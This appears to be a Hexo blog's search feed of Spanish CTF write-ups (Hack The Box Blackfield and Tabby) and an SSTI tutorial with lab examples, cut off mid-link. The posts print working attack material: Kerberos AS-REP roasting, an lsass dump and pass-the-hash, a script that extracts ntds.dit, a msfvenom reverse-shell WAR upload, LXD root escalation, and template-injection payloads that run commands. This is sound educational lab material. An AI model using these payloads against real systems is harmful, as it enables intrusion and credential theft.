<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Blackfiel Writeup</title>
      <link href="2021/01/19/Blackfield/"/>
      <url>2021/01/19/Blackfield/</url>
      
        <content type="html"><![CDATA[<p><code>HackTheBox</code></p><blockquote><p>Nombre: Blackfield<br>  Dificultad: Hard<br>  OS: Windows<br>  Puntos: 40</p></blockquote><h1 id="Enumeracion"><a href="#Enumeracion" class="headerlink" title="Enumeración"></a>Enumeración</h1><p>Enumeración de puertos </p><pre><code class="bash">nmap -p- --open -v -n -T5 -Pn 10.10.10.102</code></pre><p>Enumeracion con el script por defecto con los puertos obtenidos del escaneo anterior.</p><pre><code class="bash">nmap -sC -sV -p53,445,135,5985,88,389,3268 -oN allports -Pn blackfield.htb</code></pre><blockquote><p>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain?<br>| fingerprint-strings:<br>|   DNSVersionBindReqTCP:<br>|     version<br>|_    bind<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-20 22:32:15Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br>SF-Port53-TCP:V=7.80%I=7%D=6/20%Time=5EEE2BD1%P=x86_64-pc-linux-gnu%r(DNSV<br>SF:ersionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version<br>SF:x04bind\0\0\x10\0\x03”);<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</p></blockquote><blockquote><p>Host script results:<br>|<em>clock-skew: 7h00m49s<br>| smb2-security-mode:<br>|   2.02:<br>|</em>    Message signing enabled and required<br>| smb2-time:<br>|   date: 2020-06-20T22:34:36<br>|_  start_date: N/A</p></blockquote><p>Vemos que hay el puerto 445 abierto, hacemos un null session para listar los directiorios y obtenemos la siguiente respuesta:</p><pre><code>smbclient -L //10.10.10.192 -N_</code></pre><blockquote><pre><code>   Sharename       Type      Comment  ---------       ----      -------   ADMIN$          Disk      Remote Admin   C$              Disk      Default share   forensic        Disk      Forensic / Audit share.   IPC$            IPC       Remote IPC   NETLOGON        Disk      Logon server share   profiles$       Disk   SYSVOL          Disk      Logon server share</code></pre></blockquote><p>El siguiente passo és enumerar esos directorios para hacerlo utilizaremos ==smbclient \\&lt;IP<I>&gt;\&lt;Directorio<D>&gt; -N==</p><p>Peró queremos automatizarlo por no ir uno a uno para ello creamos el siguiente script en bash muy basico. </p><p>Una vez listado los directorios creamos un pequeño script para guardarlos en un fixero. </p><pre><code class="bash">smbclient -L //10.10.10.192/ -N &gt; f.txt &amp;&amp; cat f.txt | awk &#39;&#123;print $1&#125;&#39; | tail -n +4 &gt; folders.txt &amp;&amp; rm f.txt</code></pre><p>Y vemos y listamos todos los que tenemos permisos. </p><pre><code class="bash">for fol in $(cat folders.txt); do echo -n &quot;Try: $fol - \n&quot;; smbclient //10.10.10.192/$fol -c dir -N;done</code></pre><p>Vemos una larga lista de los usuarios asi que lo guardamos en un documento para hacer fuerza bruta y enumerar. </p><pre><code class="bash">smbclient //10.10.10.192/profiles$ -N -c dir &gt; tempusers.txt; cat tempusers.txt | awk &#39;&#123;print $1&#125;&#39; &gt; users.txt; rm tempusers.txt</code></pre><p>Ahora con un bucle for probamos haber los usuarios que existen y si alguno se puede loguear con null session.</p><pre><code class="bash">#!/bin/bashfor user in $(cat users.txt); do    msn=$(rpcclient 10.10.10.192 -U $user -N | tail -1)    if [[ $(echo &quot;$msn&quot; | grep -v &quot;ACCESS_DENIED&quot;) ]]; then            echo &quot;User exist: $user&quot;    fidone</code></pre><p>El output és el siguiente, vemos que ninguno de ellos és possible tener una session nula.</p><blockquote><p><em>User exist: audit2020</em><br><em>User exist: support</em><br><em>User exist: svc_backup</em></p></blockquote><h1 id="USER-1-support"><a href="#USER-1-support" class="headerlink" title="USER 1 : support"></a>USER 1 : support</h1><p>Los metemos en un fichero, que se llamara users.txt.<br>Utilizaremos el script GetNPUser.py_, para lograr los tickets de kerberos que no necessita preautentificación. <a href="https://www.hackingarticles.in/abusing-kerberos-using-impacket/"> Clica para más información </a></p><pre><code class="bash">GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -request -dc-ip 10.10.10.192</code></pre><blockquote><p>$krb5asrep$23$support@BLACKFIELD.LOCAL:f72434fff2bed49682c2566af5b92e1d$62bd6347ae54e6f0172703c53c383b0afed413e3396f6b79d1315e58f8817f04e316ca720cdb6faf15e4049fa822fb5d5c0069d1db841a30fb0bb7bfb599f5f88ee0305eb3ef87e8121a18def9e4e5a3756e9d39a76978dfee3127ef40684b646e28eea5bd7ed0a6180ac3572a97650c8ed499275b27785e437d7e81679fb6582e4c7212497509eb59fe67088cea8414131a885449928aca9ae9a780e51a8acb96993311ee0d042a47ac5e3f29b24044adff29f6dbeb5b2bea6e3a7b65b4c034e4fa99f0bfc85bf9c60758997522d7f50abf5edab22778bafb2d27439fa2897280460cf2b7aee9b7738a2bf2d094b054f9aaf039`</p></blockquote><p>Guardamos este output en un archivo llamado support.hash y con hashcat procedemos a lograr la contraseña de kerbereos. <a href="https://github.com/frizb/Hashcat-Cheatsheet#cracking-hashes-from-kerboroasting---krb5tgs">Hashcat Cheat sheet</a></p><pre><code class="bash">hashcat -m 18200 -a 0 -w 3 support.hash /usr/share/wordlists/rockyou.txt --force</code></pre><p>Obtenemos la siguiente respuesta<br><code>#00^BlackKnight</code></p><h1 id="USER-2-audit2020"><a href="#USER-2-audit2020" class="headerlink" title="USER 2 : audit2020"></a>USER 2 : audit2020</h1><p>Vemos que tenemos acceso desde rpcclient y los permisos que tenemos como usuario nos permite cambiar la password RPC del user audit2020, primero introduciendo la nueva contraseña del usuario y luego la del usuario support. </p><p><img src="https://i.imgur.com/RsFzDEt.png"></p><h1 id="USER-3-svc-backup"><a href="#USER-3-svc-backup" class="headerlink" title="USER 3 : svc_backup"></a>USER 3 : svc_backup</h1><p>Ahora tenemos de nuevo accesos a mas directiorios del samba concretamente al forensics.</p><pre><code class="bash">smbclient \\\\10.10.10.192\\forensic --user=audit2020%Test1234 -c &#39;prompt OFF;recurse ON; cd memory_analysis; mget *&#39;</code></pre><p>Vemos que hay un zip que se llama lssa descomprimimos y podemos ver credenciales dentro. Con lo siguiente: </p><pre><code class="bash">pypykatz lsa minidump lsass.DMP</code></pre><p>Como información importante e interesante encontramos esto. </p><blockquote><p>== MSV ==<br>        Username: svc_backup<br>        Domain: BLACKFIELD<br>        LM: NA<br>        NT: 9658d1d1dcd9250115e2205d9f48400d<br>        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c</p></blockquote><p>Vemos directamente que és possible loguearnos haciendo un pass de hash en evil-winrm </p><p><img src="https://i.imgur.com/UBkhp59.png"></p><h1 id="Escalacion-de-privilegios-Administrator"><a href="#Escalacion-de-privilegios-Administrator" class="headerlink" title="Escalación de privilegios : Administrator"></a>Escalación de privilegios : Administrator</h1><p>Hacemos la enumeración basica para escalación de privilegios.</p><p>Iniciamos con un ==whoami /all== y vemos información interesante en los privilegios. </p><p><img src="https://i.imgur.com/Oz4ITL8.png"></p><h2 id="Preparacion-del-exploit"><a href="#Preparacion-del-exploit" class="headerlink" title="Preparación del exploit"></a>Preparación del exploit</h2><p>Buscamos como extraer el archivo NTDS.dit y el registro del sistema ya que nuestro usuario tiene permisos de backup.<br>El script que usamos es necessario <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">DiskShadow</a> para copiar y extraer información al volumen Shadow.</p><p>Para abusar de este script primero es necessario tener descargado estos dos dll que los encontramos en el repositorio <em><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></em></p><p>A mi personalmente me gusta crear un directiorio temporal para ser el menos visible y asi és mucho más fàcil trabajar desde allí.</p><p>Subimos los archivos en ese directorio. </p><p><img src="https://i.imgur.com/Ww2qr7Y.png"></p><p>Y ahora nos descargamos el siguiente script automatizado para lograr la escalación de privilegios. <a href="https://raw.githubusercontent.com/return-z/SeBackupPrivilege-Abuse/master/SeBackupPrivAbuse.ps1">SeBackupPrivAbuse.ps1</a></p><pre><code class="powershell">#PS Script to use the SeBackupPrivilege for extracting the ntds.dit file and reg system file#Purely for educational purposes. Illegal purposes are not intended.#Not completely my ideas. Taken from a few sources and put together in one place.$current_path = Get-Location#Uncomment the lines below if https connenction is allowed or working, otherwise download the dlls and save on the machine#Invoke-WebRequest -Uri &quot;https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll&quot; -OutFile &quot;SeBackupPrivilegeUtils.dll&quot;#Invoke-WebRequest -Uri &quot;https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll&quot; -OutFile &quot;SeBackupPrivilegeCmdLets.dll&quot;Import-Module .\SeBackupPrivilegeUtils.dllImport-Module .\SeBackupPrivilegeCmdLets.dllSet-SeBackupPrivilege#set ACL in the windows folder$path = &quot;C:\windows\&quot;$user = &quot;DOMAIN\USER&quot;     #EDIT THIS LINE BEFORE USAGE$acl = get-acl -Path $path$acl_rule = $user,&#39;FullControl&#39;,&#39;ContainerInherit,ObjectInherit&#39;,&#39;None&#39;,&#39;Allow&#39;$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule $acl_rule$acl.AddAccessRule($access_rule)Set-Acl -Path $path -AclObject $acl#Creating a script file for DiskShadow&quot;set metadata C:\windows\temp\metadata.cab&quot; | Out-File script.txt -encoding ascii&quot;set context persistent nowriters&quot; | Out-File script.txt -encoding ascii -append&quot;begin backup&quot; | Out-File script.txt -encoding ascii -append&quot;add volume c: alias mydrive&quot; | Out-File script.txt -encoding ascii -append&quot;create&quot; | Out-File script.txt -encoding ascii -append&quot;expose %mydrive% k:&quot; | Out-File script.txt -encoding ascii -append#Using DiskShadow to get create a Volume Shadow Copycd /windows/system32cmd /c &quot;diskshadow.exe /s $current_path\\script.txt&quot;Copy-FileSeBackupPrivilege k:\windows\ntds\ntds.dit $current_path\\ntds.dit -Overwritecd $current_pathdel script.txt#Cleanup &quot;delete shadows exposed k:&quot; | Out-File script.txt -encoding ascii -append&quot;exit&quot; | Out-File script.txt -encoding ascii -appendcd /windows/system32cmd /c &quot;diskshadow.exe /s $current_path\\script.txt&quot;cd $current_pathdel script.txt#Get the system registry hivecmd /c &quot;reg.exe save hklm\system .\system.bak&quot;</code></pre><p>Ahora obtendremos los dos ficheros, los descargamos para poder<br>obtener el hash Administrador, utilizando SecretsDump.py_.</p><p><img src="https://i.imgur.com/bz5s05Q.png"></p><p>Accedemos al user Administrator y obtenemos la flag del root.</p><p><img src="https://i.imgur.com/bqzx0ig.png"><br></p>]]></content>
      
      
      <categories>
          
          <category> Windows, Active Directory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows, HTB, Active Directory, kerberos, hashcat, rpcclient, disckshadow, evil-winrm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2020/12/26/hello-world/"/>
      <url>2020/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Server-side template injection</title>
      <link href="2020/07/08/SSTI/"/>
      <url>2020/07/08/SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p><img src="https://i.imgur.com/Q2sEwHS.png"></p><h2 id="Que-es-STTI"><a href="#Que-es-STTI" class="headerlink" title="Que és STTI"></a>Que és STTI</h2><p>Sus siglas significan “Server Side Template Injection”, y lo que ocurre en esta vulnerabilidad es cuando una pagina web es dinámica i se habilita introducir datos hacia paginas web o emails. Eso permite el atacante introducir una plantilla y así habilitar la inyección al lado del servidor. Eso es bastante fácil de confundir con el Cross-Site Scripting (XSS) o simplemente omitirlo.<br>A diferencia del XXS, la inyección de plantillas se puede utilizar para atacar directamente los componentes internos de los servidores web y a menudo obtener una ejecución remota (RCE), eso se convierte en un punto potencial para hacer el pivoting.</p><p>Ejemplo de código, vemos que pregunta un nombre en un formulario y después contesta con un Hello (nombre introducido).</p><pre><code class="XML">template = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;\    &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;\        What is 2+2:&lt;br&gt;\        &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;\        &lt;input type=&quot;sumbit&quot; value=&quot;Submit&quot;&gt;\    &lt;/form&gt;&lt;h2&gt;%s! &lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot; %user_inputreturn render_template_string(template)</code></pre><h2 id="Identificacion"><a href="#Identificacion" class="headerlink" title="Identificación"></a>Identificación</h2><p>Lo primero que se tiene que hacer es comprobar és intrucciones en texto plano, existen varias plantillas distintas y se tiene que identificar el payload correspondiente. Las expressiones más comunes són: </p><pre><code class="html">Var puede ser un calculo como &#123;&#123;20+1&#125;&#125; o &#123;&#123;3*'7'&#125;&#125;&#123;var&#125; $&#123;var&#125; &lt;%= var %&gt; [% var %]</code></pre><p>Si utilizamos el mismo ejemplo anterior y la respuesta és:</p><blockquote><p> 21</p></blockquote><p><img src="https://i.imgur.com/oXbEo2D.png"></p><p>Eso significa que hemos encontrado el SSTI. Para seguir podemos buscar los payloads para la ejecucion de comandos, lo he sacado de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#read-remote-file">PayloadsAllTheThings</a>.</p><h2 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h2><p>Para leer contenido podemos utilizar,  con esto tendriamos un LFI. </p><pre><code class="Django">&#123;&#123; config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() &#125;&#125;</code></pre><p>Si queremos ejecucion de codigo podemos utilizar</p><pre><code class="Django">&#123;&#123;config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()&#125;&#125;</code></pre><p>Existe un script en python que sirve para hacer una explotacion automàtica, es <a href="https://github.com/epinna/tplmap">tplmap</a> y la sintaxis bàsica és:</p><h2 id="Ejemplos"><a href="#Ejemplos" class="headerlink" title="Ejemplos"></a>Ejemplos</h2><h3 id="Reto-1-Basic-PortSwigger"><a href="#Reto-1-Basic-PortSwigger" class="headerlink" title="Reto 1 - Basic PortSwigger"></a>Reto 1 - Basic PortSwigger</h3><p>Este ejemplo es en una lab de <a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic">https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic</a><br>A primera vista no vemos nada fuera de lo commun.<br><img src="https://i.imgur.com/IG7X5Eh.png"><br>Pero si le damos a <code>View details</code> al primer producto podemos ver que nos devuelve un mensage en tipo post.</p><p>URL : </p><pre><code>https://ac7d1f211fbf166080f8360700e500b5.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock</code></pre><p><img src="https://i.imgur.com/R0PYdBn.png"><br>Parece que podemos modificar el texto pero no ejecuta lo que hemos hecho anteriormente. Con este payload logramos que nos debuelba un message de error.</p><pre><code>?message=&lt;%= 20+1%&gt;</code></pre><p><img src="https://i.imgur.com/JJ4IzIC.png"></p><p>Una vez identificado la inyeccion vamos a probar de hacer primero el RCE.<br>Lo podemos hacer con los siguientes payloads:</p><pre><code>&lt;%= system(&#39;cat /etc/passwd&#39;) %&gt;&lt;%= `ls /` %&gt;&lt;%= IO.popen(&#39;ls /&#39;).readlines()  %&gt;&lt;% require &#39;open3&#39; %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#39;whoami&#39;) %&gt;&lt;%= @b.readline()%&gt;&lt;% require &#39;open4&#39; %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(&#39;whoami&#39;) %&gt;&lt;%= @c.readline()%&gt;</code></pre><p>El payload que utilizo en html encoded. </p><pre><code>message=%3C%=%20`id`%20%%3E</code></pre><p><img src="https://i.imgur.com/LDdj8n3.png"></p><p>Ahora seguimos con el objetivo: </p><p><img src="https://i.imgur.com/xs20tLY.png"></p><p>Asi que con el payload siguiente lo completamos.</p><pre><code>message=%3C%=%20`rm%20/home/carlos/morale.txt`%20%%3E</code></pre><p>Y completamos la lab. </p><p><img src="https://i.imgur.com/l7eRhjL.png"></p><h3 id="Reto-2-TryHackMe"><a href="#Reto-2-TryHackMe" class="headerlink" title="Reto 2 - TryHackMe"></a>Reto 2 - TryHackMe</h3><p>És el que he utilizado como ejemplo asi que ya identificamos que és una plantilla jinja2. Asi que podemos utilizar los siguientes payloads para comprovarlo. </p><pre><code>&#123;&#123;4*4&#125;&#125;[[5*5]]&#123;&#123;7*'7'&#125;&#125; would result in 7777777&#123;&#123;config.items()&#125;&#125;</code></pre><p>Ahora vamos a probar de leer la flag. </p><pre><code># Ejecucion mediante curl curl -X POST -d &#39;name=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat+%2Fflag%27%29.read%28%29%7D%7D&#39; http://10.10.171.251/ </code></pre><p>Output</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;    &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;      What&#39;s 2+2&lt;br&gt;      &lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;    &lt;/form&gt;&lt;p&gt;cooctus&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;%  </code></pre><p>Lo interessante seria obtener un shell, eso lo podemos hacer con el tlpmap. Para ello debemos inicarle el siguiente comando.</p><pre><code>tplmap.py -u http://10.10.171.251 -d &#39;name&#39; --os-shell -e Jinja2</code></pre><p><strong>Labs para practicar</strong> :<br><a href="https://github.com/s4n7h0/xvwa">https://github.com/s4n7h0/xvwa</a><br><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting">https://portswigger.net/web-security/server-side-template-injection/exploiting</a></p><p><strong>Referencias</strong>:<br><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection</a><br><a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a><br><a href="https://tryhackme.com/room/zthobscurewebvulns">https://tryhackme.com/room/zthobscurewebvulns</a></p>]]></content>
      
      
      <categories>
          
          <category> SSTI </category>
          
          <category> Linux </category>
          
          <category> Hacking Web </category>
          
          <category> SSTI </category>
          
          <category> THM </category>
          
          <category> PortSwigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tabby Writeup</title>
      <link href="2020/06/29/Tabby/"/>
      <url>2020/06/29/Tabby/</url>
      
        <content type="html"><![CDATA[<p>Nmap scan</p><pre><code class="bash">nmap -p- --open -v -n tabby.htb</code></pre><blockquote><p>PORT     STATE SERVICE<strong>2</strong><br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy</p></blockquote><pre><code class="bash">nmap -p22,80,8080 -sC -sV -o allPorts tabby.htb</code></pre><blockquote><p>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Mega Hosting<br>8080/tcp open  http    Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat</p></blockquote><h2 id="Puerto-80"><a href="#Puerto-80" class="headerlink" title="Puerto 80"></a>Puerto 80</h2><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>Vemos que en apartado de news es muy distinto a los otros del menu ya que en este te envia a un fichero que sellama statment, esto significa que hay alta probabilidad de LFI. </p><p><img src="https://i.imgur.com/89K4sdB.png"></p><p>Añadimos megahosting.htb en /etc/hosts para ver el contenido. Miramos con Burp y vemos que realmente se trata de un LFI. </p><p><img src="https://i.imgur.com/vc0fNsc.png"></p><p>Guardamos los usuarios como informacion importante asi que vamos a filtrar los que puedan loguearse, normalmente son los que acaban con /bin/bash peró eliminare los que no quiera asi el filtro sera mejor. </p><pre><code class="bash">cat etc-passwd | grep -v &quot;nologin$\|false$\|sync$&quot;</code></pre><blockquote><p>root:x:0:0:root:/root:/bin/bash<br>ash:x:1000:1000:clive:/home/ash:/bin/bash</p></blockquote><h2 id="Puerto-8080"><a href="#Puerto-8080" class="headerlink" title="Puerto 8080"></a>Puerto 8080</h2><p>Nos dirigimos a la pagina tomcat por el puerto 8080 y si leemos un poco vemos que hay dos cosas importantes, un fichero con users y hay distina informacion a tener en cuenta en este caso vemos que se trata de que el creador de la web és veterano y lo instala en CATALINA_HOME. </p><p><img src="https://i.imgur.com/p7GIRAJ.png"></p><p>Aun asi el directorio no es correcto asi que utilizamos la herrramienta ffuf para descubrirlo. </p><pre><code class="bash">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://megahosting.htb/news.php\?file\=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml -fc 404,401 -fs 0</code></pre><blockquote><pre><code>   /&#39;___\  /&#39;___\           /&#39;___\  /\ \__/ /\ \__/  __  __  /\ \__/  \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\   \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    \ \_\   \ \_\  \ \____/  \ \_\     \/_/    \/_/   \/___/    \/_/  v1.0.2</code></pre><hr><p>:: Method           : GET<br> :: URL              : <a href="http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml">http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml</a><br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200,204,301,302,307,401,403<br> :: Filter           : Response status: 404,401<br> :: Filter           : Response size: 0</p><hr></blockquote><blockquote><p>etc                     [Status: 200, Size: 2325, Words: 361, Lines: 48]</p></blockquote><p>Encontramos el xml, vemos el user y una password de tomcat.</p><pre><code class="html">&lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;</code></pre><p><img src="https://i.imgur.com/7qWZfMH.png"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>Creación del payload con metasploit con extension war.</p><pre><code class="bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></pre><p>Subir el war file, lo hacemos con curl porque no tenemos permisos de la interfaz html para ello necessitariamos ser tambien ==manager-gui==, pero al ser ==manager-script== nos permite la subida de ficheros war. </p><pre><code class="bash">curl -u tomcat:&#39;$3cureP4s5w0rd123!&#39; -T shell.war &#39;http://tabby.htb:8080/manager/text/deploy?path=/shell&amp;update=true&#39;</code></pre><blockquote><p>OK - Deployed application at context path [/shell]</p></blockquote><p>Vemos que podemos comprovar si el fichero se ha subido correctamente como dice en la web de la siguiente forma.</p><pre><code class="bash">curl -u tomcat:&#39;$3cureP4s5w0rd123!&#39; http://tabby.htb:8080/manager/text/list</code></pre><p><img src="https://i.imgur.com/G4IxakX.png"></p><p>Ejecucion de la shell</p><pre><code class="bash">curl -u tomcat:&#39;$3cureP4s5w0rd123!&#39; http://tabby.htb:8080/shell/</code></pre><h1 id="Usuario-ASH"><a href="#Usuario-ASH" class="headerlink" title="Usuario - ASH"></a>Usuario - ASH</h1><p>Vemos un arvhivo backup en <em>/var/www/html/files</em></p><h2 id="Craquear-el-zip"><a href="#Craquear-el-zip" class="headerlink" title="Craquear el zip"></a>Craquear el zip</h2><pre><code class="bash">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</code></pre><blockquote><p>PASSWORD FOUND!!!!: pw == admin@it</p></blockquote><p>Probamos de loguearnos con la password para el user. Y nos devuelve la shell. </p><p><img src="https://i.imgur.com/Rgn3QHl.png"></p><h1 id="Escalacion-de-Privilegios-ROOT"><a href="#Escalacion-de-Privilegios-ROOT" class="headerlink" title="Escalación de Privilegios - ROOT"></a>Escalación de Privilegios - ROOT</h1><p>Si vemos dentro del directiorio snap vemos un programa donde logicamente tenemos estamos dentro del grupo.</p><p><img src="https://i.imgur.com/YJwLNBi.png"></p><p>Vemos que hay una possible escalacion por ese programa. Ya que cualquier miembro local que pertenezca en este grupo puede immediatamente escalar privilegios hacia al user root. </p><h2 id="Preparacion-de-la-escalacion-de-privilegios"><a href="#Preparacion-de-la-escalacion-de-privilegios" class="headerlink" title="Preparación de la escalación de privilegios"></a>Preparación de la escalación de privilegios</h2><p>El primer passo es descargarse el build alpine. Para ejecutarlo en la maquina atacante, para ello tenemos que hacerlo con nuestro root user. Y luego transferir este archivo tar que se nos ha creado a la maquina victima. </p><pre><code class="bash">git clone https://github.com/saghul/lxd-alpine-builder.gitcd lxd-alpine-buildersudo ./build-alpine</code></pre><p><img src="https://i.imgur.com/IzB4VBa.png"></p><p>Ahora toca transferir nuestro fichero al directiorio home del usuario, és importante que sea en el home ya que sino no encuentra el tar. </p><p><img src="https://i.imgur.com/9WWvoOP.png"></p><p>El siguiente paso es crear la imagen con el LXD. </p><p><img src="https://i.imgur.com/2T7L7NI.png"></p><p>És importante leer porque nos dice que como és la primera vez que lo ejecutamos nos pide que antes utilizemos lxd init para crear la pool y asi no tener errores al crear el container. </p><p>Dejamos todo por defecto y al final listamos las imagenes. </p><p><img src="https://i.imgur.com/jPU8ebq.png"></p><p>Por ultimo, queda crear el container y ejecutarlo como root. </p><pre><code class="bash">lxc init ShadowImage ShadowDC -c security.privileged=truelxc config device add ShadowDC mydevice disk source=/ path=/mnt/root recursive=truelxc start ShadowDClxc exec ShadowDC /bin/shid</code></pre><p>Comprovación en la maquina victima. </p><p><img src="https://i.imgur.com/A65CTHw.png"></p><p>Y la flag la encontramos en la ubicacion <em>/mnt/root/root/root.txt</em></p><h1 id="Obteneindo-accesso-por-ssh"><a href="#Obteneindo-accesso-por-ssh" class="headerlink" title="Obteneindo accesso por ssh"></a>Obteneindo accesso por ssh</h1><p>Vemos que hay el puerto ssh asi que añadiremos una llave autorizada para poder acceder como root. Los passos son los siguientes:</p><p><img src="https://i.imgur.com/xdC94Bv.png"></p><p>Lo pegamos en la maquina victima.</p><p><img src="https://i.imgur.com/3ItWxfY.png"></p><p>Y ya tenemos shell por ssh. </p><p><img src="https://i.imgur.com/nBjl17D.png"></p><p>Enlaces: </p><p>LFI - <a href="https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601</a></p><p>Creación del payload war - <a href="https://netsec.ws/?p=331">https://netsec.ws/?p=331</a></p><p>Tomcat listar los ficheros subidos - <a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_Currently_Deployed_Applications">https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#List_Currently_Deployed_Applications</a></p><p>Fcrackzip - <a 